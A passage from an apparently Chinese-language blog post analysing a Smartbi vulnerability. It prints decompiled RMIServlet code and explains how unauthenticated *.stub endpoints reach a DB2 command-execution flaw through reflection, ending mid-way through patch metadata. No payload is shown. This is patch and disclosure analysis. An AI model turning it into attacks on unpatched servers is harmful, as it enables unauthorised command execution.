&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String jsonpCallback &lt;span style="color:#f92672">=&lt;/span> req.&lt;span style="color:#a6e22e">getParameter&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;jsonpCallback&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(jsonpCallback)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> doPost(req, resp);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (IOException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG.&lt;span style="color:#a6e22e">error&lt;/span>(uri &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> e.&lt;span style="color:#a6e22e">getMessage&lt;/span>(), e);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* JADX WARN: Finally extract failed */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// smartbi.framework.rmi.IRMIServlet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doPost&lt;/span>(HttpServletRequest request, HttpServletResponse resp) &lt;span style="color:#66d9ef">throws&lt;/span> ServletException, IOException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">doStartRequest&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TraceConfig traceConfig &lt;span style="color:#f92672">=&lt;/span> (TraceConfig) request.&lt;span style="color:#a6e22e">getSession&lt;/span>().&lt;span style="color:#a6e22e">getAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;TraceConfig&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">tracedetail&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> traceConfig &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> traceConfig &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TraceConfig();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> request.&lt;span style="color:#a6e22e">getSession&lt;/span>().&lt;span style="color:#a6e22e">setAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;TraceConfig&amp;#34;&lt;/span>, traceConfig);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIInfo rmiInfo &lt;span style="color:#f92672">=&lt;/span> RMIUtil.&lt;span style="color:#a6e22e">parseRMIInfo&lt;/span>(request, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String className &lt;span style="color:#f92672">=&lt;/span> rmiInfo &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : rmiInfo.&lt;span style="color:#a6e22e">getClassName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String methodName &lt;span style="color:#f92672">=&lt;/span> rmiInfo &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : rmiInfo.&lt;span style="color:#a6e22e">getMethodName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String params &lt;span style="color:#f92672">=&lt;/span> rmiInfo &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : rmiInfo.&lt;span style="color:#a6e22e">getParams&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String resultStr &lt;span style="color:#f92672">=&lt;/span> processExecute(request, className, methodName, params);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">doRollback&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">doEndRequest&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Throwable th) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">doRollback&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">doEndRequest&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> th;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>RMIUtil.parseRMIInfo方法首先判断uri是否是/vision/RMIServlet，而后获取请求的className、methodName、&lt;code>params&lt;/code>参数，并返回RMIInfo对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> RMIInfo &lt;span style="color:#a6e22e">parseRMIInfo&lt;/span>(HttpServletRequest request, &lt;span style="color:#66d9ef">boolean&lt;/span> forceParse) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/vision/RMIServlet&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">equals&lt;/span>(request.&lt;span style="color:#a6e22e">getServletPath&lt;/span>()) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>forceParse) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIInfo info &lt;span style="color:#f92672">=&lt;/span> getRMIInfoFromRequest(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (info &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> info;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String className &lt;span style="color:#f92672">=&lt;/span> request.&lt;span style="color:#a6e22e">getParameter&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;className&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String methodName &lt;span style="color:#f92672">=&lt;/span> request.&lt;span style="color:#a6e22e">getParameter&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;methodName&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String params &lt;span style="color:#f92672">=&lt;/span> request.&lt;span style="color:#a6e22e">getParameter&lt;/span>(SimpleReportBO.&lt;span style="color:#a6e22e">EL_PARAMS&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(className) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(methodName) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(params) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> request.&lt;span style="color:#a6e22e">getContentType&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> request.&lt;span style="color:#a6e22e">getContentType&lt;/span>().&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;multipart/form-data;&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DiskFileItemFactory dfif &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> DiskFileItemFactory();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ServletFileUpload upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ServletFileUpload(dfif);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String encodeString &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>FileItem&lt;span style="color:#f92672">&amp;gt;&lt;/span> fileItems &lt;span style="color:#f92672">=&lt;/span> upload.&lt;span style="color:#a6e22e">parseRequest&lt;/span>(request);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> request.&lt;span style="color:#a6e22e">setAttribute&lt;/span>(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (FileItem fileItem : fileItems) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (fileItem.&lt;span style="color:#a6e22e">isFormField&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String itemName &lt;span style="color:#f92672">=&lt;/span> fileItem.&lt;span style="color:#a6e22e">getFieldName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String itemValue &lt;span style="color:#f92672">=&lt;/span> fileItem.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;UTF-8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;className&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">equals&lt;/span>(itemName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> className &lt;span style="color:#f92672">=&lt;/span> itemValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;methodName&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">equals&lt;/span>(itemName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodName &lt;span style="color:#f92672">=&lt;/span> itemValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (SimpleReportBO.&lt;span style="color:#a6e22e">EL_PARAMS&lt;/span>.&lt;span style="color:#a6e22e">equals&lt;/span>(itemName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> params &lt;span style="color:#f92672">=&lt;/span> itemValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;encode&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">equals&lt;/span>(itemName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encodeString &lt;span style="color:#f92672">=&lt;/span> itemValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (FileUploadException &lt;span style="color:#f92672">|&lt;/span> UnsupportedEncodingException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG.&lt;span style="color:#a6e22e">error&lt;/span>(e.&lt;span style="color:#a6e22e">getMessage&lt;/span>(), e);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(encodeString)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String&lt;span style="color:#f92672">[]&lt;/span> decode &lt;span style="color:#f92672">=&lt;/span> (String&lt;span style="color:#f92672">[]&lt;/span>) CodeEntry.&lt;span style="color:#a6e22e">decode&lt;/span>(encodeString, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> className &lt;span style="color:#f92672">=&lt;/span> decode&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodName &lt;span style="color:#f92672">=&lt;/span> decode&lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> params &lt;span style="color:#f92672">=&lt;/span> decode&lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (className &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> methodName &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> className &lt;span style="color:#f92672">=&lt;/span> (String) request.&lt;span style="color:#a6e22e">getAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;className&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodName &lt;span style="color:#f92672">=&lt;/span> (String) request.&lt;span style="color:#a6e22e">getAttribute&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;methodName&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> params &lt;span style="color:#f92672">=&lt;/span> (String) request.&lt;span style="color:#a6e22e">getAttribute&lt;/span>(SimpleReportBO.&lt;span style="color:#a6e22e">EL_PARAMS&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RMIInfo info2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RMIInfo();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> info2.&lt;span style="color:#a6e22e">setClassName&lt;/span>(className);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> info2.&lt;span style="color:#a6e22e">setMethodName&lt;/span>(methodName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> info2.&lt;span style="color:#a6e22e">setParams&lt;/span>(params);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> request.&lt;span style="color:#a6e22e">setAttribute&lt;/span>(ATTR_KEY_RMI_INFO, info2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> info2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而后调用processExecute方法，最终通过exceptionToNode方法通过反射调用了对应的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">processExecute&lt;/span>(HttpServletRequest request, String className, String methodName, String params) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Map&lt;span style="color:#f92672">&amp;lt;&lt;/span>Integer, Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> map;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ClientService service &lt;span style="color:#f92672">=&lt;/span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getService&lt;/span>(className);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ClientService operationFailLogService &lt;span style="color:#f92672">=&lt;/span> RMIModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getService&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;OperationLogService&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String resultStr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSONArray jsonParams &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception ce) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (Framework.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getExceptionHandler&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Framework.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getExceptionHandler&lt;/span>().&lt;span style="color:#a6e22e">processException&lt;/span>(ce);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (className &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> methodName &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectNode resultNode &lt;span style="color:#f92672">=&lt;/span> exceptionToNode(className, methodName, ce);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resultStr &lt;span style="color:#f92672">=&lt;/span> resultNode.&lt;span style="color:#a6e22e">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String failResult &lt;span style="color:#f92672">=&lt;/span> resultNode.&lt;span style="color:#a6e22e">has&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;detail&amp;#34;&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> resultNode.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;detail&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">asText&lt;/span>((String) &lt;span style="color:#66d9ef">null&lt;/span>) : &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(failResult)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> failResult &lt;span style="color:#f92672">=&lt;/span> resultNode.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;result&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> listParams &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (0 &lt;span style="color:#f92672">!=&lt;/span> 0) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> listParams &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> jsonParams.&lt;span style="color:#a6e22e">length&lt;/span>(); i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> listParams.&lt;span style="color:#a6e22e">add&lt;/span>(jsonParams.&lt;span style="color:#a6e22e">get&lt;/span>(i));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object&lt;span style="color:#f92672">[]&lt;/span> objParams &lt;span style="color:#f92672">=&lt;/span> {className, methodName, listParams, failResult};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operationFailLogService.&lt;span style="color:#a6e22e">executeInternal&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;addOperationFailLog&amp;#34;&lt;/span>, objParams);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG.&lt;span style="color:#a6e22e">error&lt;/span>(e.&lt;span style="color:#a6e22e">getMessage&lt;/span>(), e);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">executeInternal&lt;/span>(String methodName, Object&lt;span style="color:#f92672">[]&lt;/span> objParams) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method method &lt;span style="color:#f92672">=&lt;/span> StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(methodName) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">methodList&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(methodName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (method &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(CommonErrorCode.&lt;span style="color:#a6e22e">METHOD_NAME_ERROR&lt;/span>).&lt;span style="color:#a6e22e">setDetail&lt;/span>(StringUtil.&lt;span style="color:#a6e22e">replaceHTML&lt;/span>(methodName));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object result &lt;span style="color:#f92672">=&lt;/span> method.&lt;span style="color:#a6e22e">invoke&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">module&lt;/span>, objParams);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (InvocationTargetException ex) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (ex.&lt;span style="color:#a6e22e">getCause&lt;/span>() &lt;span style="color:#66d9ef">instanceof&lt;/span> SmartbiException) {
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再来回顾一下补丁，补丁中说该漏洞是对钱一个漏洞的绕过，经过上面的分析可知*.stub接口无需身份验证，所以可以通过*.stub接口利用Smartbi内的反射调用到存在漏洞的类。&lt;/p>
&lt;p>在补丁中有如下，通过全局搜索类名DataSourceService便可知道漏洞代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;PATCH_20221122&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_zh_TW&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;desc_en&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;urls&amp;#34;&lt;/span>: [{
